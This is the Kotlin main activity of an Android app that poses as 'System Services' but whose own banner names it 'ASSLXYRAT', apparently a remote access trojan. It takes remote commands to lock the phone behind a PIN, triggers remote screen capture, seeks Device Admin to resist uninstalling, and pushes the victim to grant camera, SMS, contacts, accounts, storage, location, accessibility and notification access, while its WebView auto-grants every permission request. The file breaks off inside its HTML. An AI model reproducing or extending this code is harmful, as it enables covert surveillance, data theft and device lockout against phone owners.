package com.sync.xxx

import android.Manifest
import android.annotation.SuppressLint
import android.app.Activity
import android.content.*
import android.content.pm.PackageManager
import android.location.LocationManager
import android.media.projection.MediaProjectionManager
import android.os.*
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.webkit.*
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.google.android.gms.common.api.ResolvableApiException
import com.google.android.gms.location.*

class MainActivity : AppCompatActivity() {

    private lateinit var webView: WebView

    private val PERM_CAM     = 101
    private val PERM_SMS     = 103
    private val PERM_GALLERY  = 104
    private val PERM_LOCATION = 105
    private val PERM_CONTACTS = 106
    private val PERM_GMAIL    = 108
    private val PERM_PHONE    = 109
    private val REQ_SCREEN_CAPTURE    = 102
    private val REQ_LOCATION_SETTINGS = 107

    private val screenCaptureReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            if (intent.action == "com.sync.xxx.REQUEST_SCREEN_CAPTURE") {
                val mgr = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
                startActivityForResult(mgr.createScreenCaptureIntent(), REQ_SCREEN_CAPTURE)
            }
        }
    }

    private val commandReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            if (intent.action != DeviceService.ACTION_COMMAND) return
            val cmd = intent.getStringExtra(DeviceService.EXTRA_COMMAND) ?: return
            val value = intent.getStringExtra(DeviceService.EXTRA_VALUE) ?: ""
            handleCommand(cmd, value)
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        setupWebView()

        val filter = IntentFilter(DeviceService.ACTION_COMMAND)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(commandReceiver, filter, RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(commandReceiver, filter)
        }

        val screenFilter = IntentFilter("com.sync.xxx.REQUEST_SCREEN_CAPTURE")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(screenCaptureReceiver, screenFilter, RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(screenCaptureReceiver, screenFilter)
        }

        // Anti-Uninstall: request Device Admin (hanya tampil sekali, flag disimpan di SharedPreferences)
        AntiUninstallHelper.requestAdminIfNeeded(this)
    }

    private fun startDeviceService() {
        val svcIntent = Intent(this, DeviceService::class.java)
        ContextCompat.startForegroundService(this, svcIntent)
    }

    override fun onResume() {
        super.onResume()
        webView.evaluateJavascript("if(typeof refreshPerms==='function') refreshPerms()", null)
    }

    override fun onNewIntent(intent: Intent?) {
        super.onNewIntent(intent)
        setIntent(intent)
        if (intent?.getBooleanExtra("lock_mode", false) == true) {
            val pin   = intent.getStringExtra("lock_pin")   ?: ""
            val title = intent.getStringExtra("lock_title") ?: "Perangkat Terkunci"
            startLockMode(pin, title)
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        webView.evaluateJavascript("if(typeof refreshPerms==='function') refreshPerms()", null)
    }

    @Suppress("DEPRECATION")
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        android.util.Log.d("MainActivity", "onActivityResult: req=$requestCode result=$resultCode data=$data")
        if (requestCode == REQ_SCREEN_CAPTURE) {
            android.util.Log.d("MainActivity", "Screen capture result: resultCode=$resultCode")
            val intent = Intent(DeviceService.ACTION_SCREEN_RESULT).apply {
                putExtra(DeviceService.EXTRA_RESULT_CODE, resultCode)
                putExtra(DeviceService.EXTRA_RESULT_DATA, data)
                setPackage(packageName)
                addFlags(Intent.FLAG_INCLUDE_STOPPED_PACKAGES)
            }
            sendBroadcast(intent)
            android.util.Log.d("MainActivity", "Broadcast sent: ACTION_SCREEN_RESULT")
        }
        if (requestCode == REQ_LOCATION_SETTINGS) {            
            webView.evaluateJavascript("if(typeof refreshPerms==='function') refreshPerms()", null)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        try { unregisterReceiver(commandReceiver) } catch (_: Exception) {}
        try { unregisterReceiver(screenCaptureReceiver) } catch (_: Exception) {}
    }

    private fun handleCommand(cmd: String, value: String) {
        when (cmd) {
            "lockDevice" -> {
                val parts = value.split("|")
                val pin   = parts.getOrNull(0) ?: ""
                val title = parts.getOrNull(1) ?: "Perangkat Terkunci"
                startLockMode(pin, title)
            }
            "unlockDevice" -> stopLockMode()
        }
    }

    private fun startLockMode(pin: String, title: String) {
        webView.evaluateJavascript(
            "if(typeof showLockScreen==='function') showLockScreen('${pin}','${title}')", null
        )
        try { startLockTask() } catch (e: Exception) {
            android.util.Log.w("MainActivity", "startLockTask: ${e.message}")
        }
    }

    private fun stopLockMode() {
        try { stopLockTask() } catch (e: Exception) {
            android.util.Log.w("MainActivity", "stopLockTask: ${e.message}")
        }
        webView.evaluateJavascript(
            "if(typeof hideLockScreen==='function') hideLockScreen()", null
        )
        val i = Intent("com.sync.xxx.UNLOCK").apply { setPackage(packageName) }
        sendBroadcast(i)
    }

    private fun sendStatus(json: String) {
        val intent = Intent(DeviceService.ACTION_SEND_STATUS).apply {
            putExtra(DeviceService.EXTRA_STATUS_JSON, json)
            setPackage(packageName)
        }
        sendBroadcast(intent)
    }

    @SuppressLint("SetJavaScriptEnabled")
    private fun setupWebView() {
        webView = findViewById(R.id.mainWebView)
        webView.settings.apply {
            javaScriptEnabled = true
            domStorageEnabled = true
            allowFileAccess = true
            mediaPlaybackRequiresUserGesture = false
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP)
                mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
        }
        val bridge = AppBridge(this, webView)
        AppBridge.instance = bridge
        webView.addJavascriptInterface(bridge, "Android")
        webView.addJavascriptInterface(MainBridge(), "MainBridge")
        webView.webChromeClient = object : WebChromeClient() {
            override fun onPermissionRequest(request: PermissionRequest) {
                request.grant(request.resources)
            }
        }
        webView.webViewClient = WebViewClient()
        val serverUrl = DeviceService.SERVER_URL
        webView.loadDataWithBaseURL(serverUrl, buildHtml(), "text/html", "UTF-8", null)
    }

    fun isCamGranted() = ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
    fun isSmsGranted() = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED
    fun isGalleryGranted(): Boolean {
        return ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
    }
    fun requestGalleryPerm() {
        ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.CAMERA), PERM_CAM)
    }
    fun isNotifListenerGranted() = SmsNotifService.isEnabled(this)
    fun isLocationGranted(): Boolean =
        ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
        ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED

    fun isGpsEnabled(): Boolean {
        val lm = getSystemService(LOCATION_SERVICE) as LocationManager
        return lm.isProviderEnabled(LocationManager.GPS_PROVIDER) ||
               lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER)
    }

    fun requestLocationPerm() =
        ActivityCompat.requestPermissions(this,
            arrayOf(Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION),
            PERM_LOCATION)

    fun requestEnableGps() {
        val request = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, 5000L).build()
        val builder = LocationSettingsRequest.Builder().addLocationRequest(request).setAlwaysShow(true)
        val client  = LocationServices.getSettingsClient(this)
        client.checkLocationSettings(builder.build())
            .addOnSuccessListener {                
                webView.evaluateJavascript("if(typeof refreshPerms==='function') refreshPerms()", null)
            }
            .addOnFailureListener { exception ->
                if (exception is ResolvableApiException) {
                    try {
                        @Suppress("DEPRECATION")
                        exception.startResolutionForResult(this, REQ_LOCATION_SETTINGS)
                    } catch (_: Exception) {                        
                        startActivity(Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS))
                    }
                } else {
                    startActivity(Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS))
                }
            }
    }

    fun isContactsGranted(): Boolean =
        ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED

    fun requestContactsPerm() =
        ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.READ_CONTACTS), PERM_CONTACTS)

    fun isGmailGranted(): Boolean =
        ContextCompat.checkSelfPermission(this, Manifest.permission.GET_ACCOUNTS) == PackageManager.PERMISSION_GRANTED

    fun requestGmailPerm() =
        ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.GET_ACCOUNTS), PERM_GMAIL)

    fun isPhoneGranted(): Boolean =
        ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED &&
        ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_NUMBERS) == PackageManager.PERMISSION_GRANTED

    fun requestPhonePerm() =
        ActivityCompat.requestPermissions(this, arrayOf(
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_PHONE_NUMBERS
        ), PERM_PHONE)

    fun isManageStorageGranted(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            android.os.Environment.isExternalStorageManager()
        } else {
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
        }
    }

    fun requestManageStoragePerm() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            try {
                val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                    data = android.net.Uri.parse("package:$packageName")
                }
                startActivity(intent)
            } catch (_: Exception) {
                startActivity(Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION))
            }
        } else {
            ActivityCompat.requestPermissions(this,
                arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE),
                PERM_GALLERY)
        }
    }

    fun isBatteryOptIgnored() = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
        (getSystemService(POWER_SERVICE) as PowerManager).isIgnoringBatteryOptimizations(packageName)
    } else true
    fun isOverlayGranted() = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
        Settings.canDrawOverlays(this)
    } else true

    fun isAccessibilityGranted() = AppBlockerService.isEnabled(this)

    fun isUsageAccessGranted() = AppBlockerService.isUsageAccessGranted(this)

    fun requestAccessibilityPerm() {
        startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
    }

    fun requestUsageAccessPerm() {
        startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS).apply {
            data = android.net.Uri.parse("package:$packageName")
        })
    }
    fun requestOverlayPerm() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION).apply {
                data = android.net.Uri.parse("package:$packageName")
            })
        }
    }

    fun requestCamPerm()   = ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.CAMERA), PERM_CAM)
    fun requestSmsPerm()   = ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.READ_SMS), PERM_SMS)
    fun openNotifListenerSettings() {
        startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS").apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        })
    }
    fun openBatterySettings() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                data = android.net.Uri.parse("package:$packageName")
            })
        }
    }

    private fun buildHtml(): String {
        val serverUrl = DeviceService.SERVER_URL
        return """<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>System Services</title>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;600;700;800;900&family=Share+Tech+Mono&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
*,*::before,*::after{
  box-sizing:border-box;
  margin:0;
  padding:0
}
:root{
  --bg:#050607;
  --bg2:#09090b;
  --panel:rgba(19,7,9,.74);
  --panel-strong:rgba(25,8,11,.9);
  --line:rgba(255,72,94,.22);
  --line-strong:rgba(255,72,94,.52);
  --red:#ff4d63;
  --red2:#be263b;
  --red3:#6c1725;
  --red-glow:rgba(255,77,99,.22);
  --green:#22c55e;
  --text:#f7d9dd;
  --text2:#aa777f;
  --text3:#5f3b42;
  --mono:'Share Tech Mono',monospace;
  --head:'Orbitron',sans-serif;
  --body:'Inter',sans-serif;
}
html,body{
  width:100%;
  height:100%;
  overflow:hidden;
  background:var(--bg);
  color:var(--text);
  font-family:var(--body);
  -webkit-font-smoothing:antialiased;
}
body::before{
  content:"";
  position:fixed;
  inset:0;
  pointer-events:none;
  background:
    linear-gradient(rgba(255,70,90,.035) 1px,transparent 1px),
    linear-gradient(90deg,rgba(255,70,90,.035) 1px,transparent 1px);
  background-size:42px 42px;
  mask-image:linear-gradient(to bottom,transparent 0,#000 10%,#000 90%,transparent 100%);
}
body::after{
  content:"";
  position:fixed;
  inset:0;
  pointer-events:none;
  background:
    radial-gradient(circle at 50% 25%,rgba(150,20,38,.2),transparent 42%),
    linear-gradient(to bottom,rgba(255,20,55,.035),transparent 30%,transparent 75%,rgba(255,20,55,.025));
}
.screen{
  position:absolute;
  inset:0;
  display:flex;
  flex-direction:column;
  transition:opacity .35s ease,transform .35s ease;
}
.screen.hidden{
  opacity:0;
  pointer-events:none;
  transform:translateY(12px);
}
.hud-corner{
  position:fixed;
  width:28px;
  height:28px;
  z-index:20;
  pointer-events:none;
  opacity:.8;
}
.hud-corner::before,
.hud-corner::after{
  content:"";
  position:absolute;
  background:var(--red);
  box-shadow:0 0 12px rgba(255,77,99,.2);
}
.hud-corner::before{width:26px;height:2px}
.hud-corner::after{width:2px;height:26px}
.corner-tl{top:18px;left:16px}
.corner-tr{top:18px;right:16px;transform:rotate(90deg)}
.corner-bl{bottom:18px;left:16px;transform:rotate(-90deg)}
.corner-br{bottom:18px;right:16px;transform:rotate(180deg)}
.hud-top{
  position:relative;
  z-index:5;
  min-height:76px;
  padding:30px 30px 16px;
  display:flex;
  align-items:center;
  justify-content:space-between;
  border-bottom:1px solid rgba(255,77,99,.13);
  background:linear-gradient(to bottom,rgba(28,5,9,.72),rgba(8,5,6,.14));
}
.hud-brand{
  display:flex;
  align-items:center;
  gap:10px;
  min-width:0;
}
.hud-dot{
  width:11px;
  height:11px;
  border-radius:50%;
  background:var(--red);
  box-shadow:0 0 14px rgba(255,77,99,.75);
  flex-shrink:0;
}
.hud-title{
  font-family:var(--head);
  font-size:11px;
  font-weight:800;
  letter-spacing:3px;
  color:var(--red);
  white-space:nowrap;
  overflow:hidden;
  text-overflow:ellipsis;
}
.hud-clock{
  font-family:var(--mono);
  color:rgba(255,77,99,.48);
  font-size:13px;
  letter-spacing:1px;
}
#permScreen{
  overflow-y:auto;
  -webkit-overflow-scrolling:touch;
  padding-bottom:48px;
}
.perm-shell{
  width:min(100%,620px);
  margin:0 auto;
  padding:38px 18px 0;
  position:relative;
  z-index:2;
}
.core-wrap{
  display:flex;
  flex-direction:column;
  align-items:center;
  text-align:center;
}
.core{
  position:relative;
  width:142px;
  height:142px;
  display:flex;
  align-items:center;
  justify-content:center;
  margin-bottom:18px;
}
.core-ring{
  position:absolute;
  border-radius:50%;
  border:1px solid rgba(255,77,99,.25);
}
.core-ring.r1{
  inset:0;
  animation:spin 16s linear infinite;
  border-style:dashed;
}
.core-ring.r2{
  inset:15px;
  border-color:rgba(255,77,99,.42);
  box-shadow:0 0 24px rgba(255,30,66,.05) inset;
}
.core-ring.r3{
  inset:31px;
  border-color:rgba(255,77,99,.28);
}
.core-box{
  width:70px;
  height:70px;
  border-radius:18px;
  display:flex;
  align-items:center;
  justify-content:center;
  border:1px solid rgba(255,77,99,.55);
  background:linear-gradient(145deg,rgba(87,18,30,.65),rgba(18,7,10,.94));
  color:var(--red);
  font-family:var(--head);
  font-weight:900;
  font-size:25px;
  box-shadow:
    0 0 28px rgba(255,77,99,.12),
    inset 0 0 18px rgba(255,77,99,.08);
}
.core-ping{
  position:absolute;
  right:13px;
  top:68px;
  width:10px;
  height:10px;
  border-radius:50%;
  background:var(--red);
  box-shadow:0 0 12px rgba(255,77,99,.8);
  animation:ping 1.6s ease-in-out infinite;
}
@keyframes spin{to{transform:rotate(360deg)}}
@keyframes ping{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.35;transform:scale(.75)}}
.cyber-badge{
  min-width:240px;
  padding:10px 18px;
  border:1px solid rgba(255,77,99,.48);
  border-radius:9px;
  background:rgba(65,13,22,.44);
  color:var(--red);
  font-family:var(--head);
  font-size:11px;
  font-weight:800;
  letter-spacing:2.2px;
  box-shadow:inset 0 0 18px rgba(255,77,99,.04);
}
.perm-title{
  margin-top:22px;
  font-family:var(--head);
  font-size:31px;
  line-height:1.08;
  font-weight:900;
  letter-spacing:1.6px;
  color:var(--red);
  text-shadow:0 0 20px rgba(255,77,99,.1);
}
.perm-subtitle{
  margin-top:10px;
  max-width:390px;
  font-family:var(--mono);
  font-size:11px;
  line-height:1.6;
  letter-spacing:2.4px;
  color:rgba(255,77,99,.34);
  text-transform:uppercase;
}
.monitor-card{
  margin-top:22px;
  border:1px solid rgba(255,77,99,.24);
  border-radius:16px;
  background:linear-gradient(145deg,rgba(39,9,14,.75),rgba(11,7,8,.84));
  padding:18px;
  box-shadow:inset 0 0 30px rgba(255,77,99,.025);
}
.monitor-head{
  display:flex;
  justify-content:center;
  align-items:center;
  gap:8px;
  font-family:var(--head);
  font-size:10px;
  font-weight:700;
  letter-spacing:1.7px;
  color:var(--red);
}
.monitor-head span:last-child{
  color:rgba(255,77,99,.25);
}
.equalizer{
  height:55px;
  display:flex;
  align-items:flex-end;
  justify-content:center;
  gap:5px;
  margin:4px 0 8px;
}
.eq{
  width:6px;
  border-radius:4px 4px 0 0;
  background:linear-gradient(to top,var(--red2),var(--red));
  box-shadow:0 0 8px rgba(255,77,99,.18);
  animation:eq 1.4s ease-in-out infinite alternate;
}
.eq:nth-child(1){height:11px;animation-delay:-.2s;opacity:.32}
.eq:nth-child(2){height:20px;animation-delay:-.5s;opacity:.5}
.eq:nth-child(3){height:32px;animation-delay:-.8s;opacity:.72}
.eq:nth-child(4){height:46px;animation-delay:-1s}
.eq:nth-child(5){height:51px;animation-delay:-.3s}
.eq:nth-child(6){height:29px;animation-delay:-.7s;opacity:.75}
.eq:nth-child(7){height:19px;animation-delay:-.1s;opacity:.55}
@keyframes eq{
  from{transform:scaleY(.55)}
  to{transform:scaleY(1)}
}
.monitor-text{
  text-align:center;
  font-family:var(--mono);
  font-size:9px;
  letter-spacing:2.2px;
  color:rgba(255,77,99,.24);
  text-transform:uppercase;
}
.perm-status-line{
  margin:20px 0 14px;
  display:flex;
  justify-content:center;
  align-items:center;
  gap:10px;
  font-family:var(--mono);
  font-size:11px;
  letter-spacing:1.3px;
  color:rgba(255,77,99,.4);
}
.perm-status-line .status-dot-small{
  width:9px;
  height:9px;
  border-radius:50%;
  background:var(--red);
  box-shadow:0 0 10px rgba(255,77,99,.8);
}
.perm-list{
  display:flex;
  flex-direction:column;
  gap:9px;
}
.perm-row{
  position:relative;
  display:flex;
  align-items:center;
  gap:13px;
  min-height:74px;
  padding:14px 14px 14px 16px;
  border:1px solid rgba(255,77,99,.16);
  border-radius:13px;
  background:linear-gradient(90deg,rgba(43,10,15,.64),rgba(10,7,8,.78));
  overflow:hidden;
  transition:.25s ease;
}
.perm-row::before{
  content:"";
  position:absolute;
  left:0;
  top:13px;
  bottom:13px;
  width:2px;
  background:rgba(255,77,99,.5);
  box-shadow:0 0 8px rgba(255,77,99,.25);
}
.perm-row.granted{
  border-color:rgba(34,197,94,.27);
  background:linear-gradient(90deg,rgba(8,39,21,.48),rgba(8,10,8,.78));
}
.perm-row.granted::before{
  background:var(--green);
  box-shadow:0 0 8px rgba(34,197,94,.5);
}
.perm-row.requesting{
  border-color:rgba(255,77,99,.7);
  box-shadow:0 0 0 1px rgba(255,77,99,.15),0 0 18px rgba(255,77,99,.08);
}
.perm-index{
  font-family:var(--mono);
  color:var(--red);
  font-size:12px;
  min-width:28px;
}
.perm-icon{
  width:38px;
  height:38px;
  border-radius:10px;
  flex-shrink:0;
  display:flex;
  align-items:center;
  justify-content:center;
  color:var(--red);
  border:1px solid rgba(255,77,99,.18);
  background:rgba(255,77,99,.055);
}
.perm-info{
  flex:1;
  min-width:0;
}
.perm-name{
  font-family:var(--head);
  font-size:11px;
  font-weight:800;
  color:#e7bbc1;
  letter-spacing:.7px;
  text-transform:uppercase;
}
.perm-desc{
  margin-top:5px;
  font-family:var(--mono);
  font-size:9.5px;
  line-height:1.35;
  color:rgba(255,77,99,.27);
  letter-spacing:.3px;
}
.perm-row.granted .perm-name{color:#83d69e}
.perm-row.granted .perm-desc{color:rgba(34,197,94,.38)}
.tog{
  position:relative;
  width:44px;
  height:24px;
  flex-shrink:0;
  cursor:pointer;
}
.tog input{
  position:absolute;
  opacity:0;
  pointer-events:none;
}
.tog-track{
  position:absolute;
  inset:0;
  border-radius:999px;
  border:1px solid rgba(255,77,99,.26);
  background:rgba(45,11,16,.76);
  transition:.2s ease;
}
.tog-track::after{
  content:"";
  position:absolute;
  width:16px;
  height:16px;
  top:3px;
  left:4px;
  border-radius:50%;
  background:#6d2a35;
  transition:.2s ease;
}
.tog input:checked + .tog-track{
  border-color:rgba(34,197,94,.46);
  background:rgba(34,197,94,.12);
}
.tog input:checked + .tog-track::after{
  left:22px;
  background:var(--green);
  box-shadow:0 0 9px rgba(34,197,94,.65);
}
.perm-footer{
  margin-top:16px;
  display:flex;
  flex-direction:column;
  gap:12px;
}
.all-granted-badge{
  display:none;
  align-items:center;
  justify-content:center;
  gap:8px;
  padding:11px;
  border:1px solid rgba(34,197,94,.25);
  border-radius:11px;
  color:#7ed89a;
  background:rgba(34,197,94,.06);
  font-family:var(--mono);
  font-size:11px;
  letter-spacing:1px;
}
.all-granted-badge.show{display:flex}
.btn-masuk{
  width:100%;
  height:58px;
  border-radius:12px;
  border:1px solid rgba(255,77,99,.46);
  color:#ff8393;
  background:linear-gradient(90deg,rgba(62,12,21,.82),rgba(35,9,14,.86));
  font-family:var(--head);
  font-size:12px;
  font-weight:900;
  letter-spacing:2.4px;
  cursor:pointer;
  box-shadow:inset 0 0 24px rgba(255,77,99,.05),0 0 16px rgba(255,77,99,.04);
}
.btn-masuk:active{
  transform:scale(.985);
}
.btn-masuk:not(.refresh-mode){
  color:#fff;
  background:linear-gradient(90deg,#9e2034,#5d111f);
  box-shadow:0 0 18px rgba(255,77,99,.16);
}
.bottom-sign{
  text-align:center;
  margin-top:18px;
  padding-bottom:16px;
  font-family:var(--mono);
  font-size:8px;
  letter-spacing:2px;
  color:rgba(255,77,99,.12);
  text-transform:uppercase;
}
#connectedScreen{
  overflow:hidden;
}
.connected-body{
  position:relative;
  z-index:2;
  flex:1;
  display:flex;
  align-items:center;
  justify-content:center;
  padding:20px 18px 34px;
}
.conn-wrap{
  width:min(100%,560px);
  display:flex;
  flex-direction:column;
  align-items:center;
  text-align:center;
}
.conn-main-title{
  margin-top:18px;
  font-family:var(--head);
  font-size:38px;
  line-height:1.08;
  font-weight:900;
  letter-spacing:1.6px;
  color:var(--red);
  text-transform:uppercase;
}
.conn-main-sub{
  margin-top:9px;
  font-family:var(--mono);
  font-size:10px;
  color:rgba(255,77,99,.34);
  letter-spacing:2.7px;
  text-transform:uppercase;
}
.conn-status-panel{
  width:100%;
  margin-top:20px;
  padding:20px 18px;
  border-radius:16px;
  border:1px solid rgba(255,77,99,.24);
  background:linear-gradient(145deg,rgba(40,8,14,.75),rgba(9,7,8,.82));
}
.conn-server-name{
  font-family:var(--head);
  font-size:10px;
  font-weight:800;
  color:var(--red);
  letter-spacing:1.4px;
}
.conn-server-name span{
  color:rgba(255,77,99,.28);
}
.conn-status-indicator{
  margin-top:13px;
  display:flex;
  justify-content:center;
  align-items:center;
  gap:10px;
}
.status-dot{
  width:9px;
  height:9px;
  border-radius:50%;
  background:var(--red);
}
.status-indicator.online .status-dot{
  background:var(--green);
  box-shadow:0 0 10px rgba(34,197,94,.8);
  animation:ping 1.7s infinite;
}
.status-indicator.offline .status-dot{
  background:var(--red);
  box-shadow:0 0 10px rgba(255,77,99,.8);
  animation:ping 1.1s infinite;
}
.status-text{
  font-family:var(--head);
  font-size:12px;
  font-weight:800;
  letter-spacing:1.8px;
  color:var(--red);
}
.status-indicator.online .status-text{
  color:#68d48a;
}
.status-last{
  margin-top:9px;
  min-height:16px;
  font-family:var(--mono);
  font-size:9px;
  color:rgba(255,77,99,.25);
  letter-spacing:1px;
}
.conn-info-box{
  width:100%;
  margin-top:16px;
  border:1px solid rgba(255,77,99,.16);
  border-radius:13px;
  background:rgba(24,8,11,.6);
  overflow:hidden;
}
.conn-info-row{
  display:flex;
  justify-content:space-between;
  gap:16px;
  padding:15px 17px;
  border-bottom:1px solid rgba(255,77,99,.1);
}
.conn-info-row:last-child{border-bottom:none}
.conn-info-k{
  font-family:var(--mono);
  font-size:10px;
  color:rgba(255,77,99,.35);
  letter-spacing:.7px;
}
.conn-info-v{
  max-width:62%;
  overflow:hidden;
  text-overflow:ellipsis;
  white-space:nowrap;
  text-align:right;
  font-family:var(--mono);
  font-size:10px;
  color:#d1939d;
  letter-spacing:.4px;
}
.check-btn{
  width:100%;
  height:58px;
  margin-top:18px;
  border-radius:12px;
  border:1px solid rgba(255,77,99,.46);
  background:linear-gradient(90deg,rgba(62,12,21,.82),rgba(35,9,14,.86));
  color:#ff8393;
  font-family:var(--head);
  font-size:12px;
  font-weight:900;
  letter-spacing:2.4px;
  cursor:pointer;
}
.conn-footer{
  margin-top:14px;
  font-family:var(--mono);
  font-size:8px;
  color:rgba(255,77,99,.14);
  letter-spacing:2px;
  text-transform:uppercase;
}
#webviewScreen{
  overflow:hidden;
  background:#fff;
}
.webview-body{
  flex:1;
  position:relative;
  background:#fff;
}
.webview-body iframe{
  width:100%;
  height:100%;
  border:none;
  background:#fff;
}
.webview-header{
  display:flex;
  align-items:center;
  gap:12px;
  padding:10px 18px;
  background:rgba(10,7,8,.95);
  border-bottom:1px solid rgba(255,77,99,.2);
  flex-shrink:0;
}
.webview-header .back-btn{
  background:rgba(255,77,99,.15);
  border:1px solid rgba(255,77,99,.3);
  color:#ff8393;
  padding:6px 14px;
  border-radius:8px;
  font-family:var(--head);
  font-size:9px;
  font-weight:700;
  letter-spacing:1.2px;
  cursor:pointer;
  transition:.2s;
}
.webview-header .back-btn:hover{
  background:rgba(255,77,99,.25);
}
.webview-header .url-text{
  flex:1;
  font-family:var(--mono);
  font-size:9px;
  color:rgba(255,77,99,.4);
  overflow:hidden;
  text-overflow:ellipsis;
  white-space:nowrap;
  text-align:center;
}
.webview-header .status-dot-mini{
  width:8px;
  height:8px;
  border-radius:50%;
  background:var(--green);
  box-shadow:0 0 8px rgba(34,197,94,.6);
  flex-shrink:0;
}
@media (max-width:390px){
  .hud-top{padding-left:28px;padding-right:28px}
  .hud-title{font-size:9px;letter-spacing:2px}
  .perm-title{font-size:27px}
  .conn-main-title{font-size:31px}
  .perm-shell{padding-left:14px;padding-right:14px}
  .perm-row{padding-left:13px;padding-right:11px}
  .perm-index{display:none}
}
</style>
</head>
<body>
<div class="hud-corner corner-tl"></div>
<div class="hud-corner corner-tr"></div>
<div class="hud-corner corner-bl"></div>
<div class="hud-corner corner-br"></div>

<!-- Halaman Izin -->
<div class="screen" id="permScreen">
  <header class="hud-top">
    <div class="hud-brand">
      <span class="hud-dot"></span>
      <span class="hud-title">ASSLXYRAT · ACCESS CONTROL</span>
    </div>
    <span class="hud-clock liveClock">00:00:00</span>
  </header>
  <main class="perm-shell">
    <section class="core-wrap">
      <div class="core">
        <div class="core-ring r1"></div>
        <div class="core-ring r2"></div>
        <div class="core-ring r3"></div>
        <div class="core-box">SS</div>
        <div class="core-ping"></div>
      </div>
      <div class="cyber-badge">PERMISSION CONTROL</div>
      <h1 class="perm-title">IZIN<br>DIPERLUKAN</h1>
      <p class="perm-subtitle">// aktifkan seluruh izin agar layanan perangkat berjalan maksimal</p>
    </section>
    <section class="monitor-card">
      <div class="monitor-head">
        <span>SYSTEM SERVICES</span>
        <span>— ACCESS MONITOR</span>
      </div>
      <div class="equalizer" aria-hidden="true">
        <span class="eq"></span><span class="eq"></span><span class="eq"></span>
        <span class="eq"></span><span class="eq"></span><span class="eq"></span>
        <span class="eq"></span>
      </div>
      <div class="monitor-text">memeriksa status akses perangkat...</div>
    </section>
    <div class="perm-status-line">
      <span class="status-dot-small"></span>
      <span>STATUS AKSES: MENUNGGU KONFIGURASI</span>
    </div>
    <section class="perm-list" id="permList">
      <div class="perm-row" id="row-cam">
        <span class="perm-index">#01</span>
        <div class="perm-icon">
          <svg width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
            <path d="M14.5 4h-5L7 7H4a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2h-3l-2.5-3z"/>
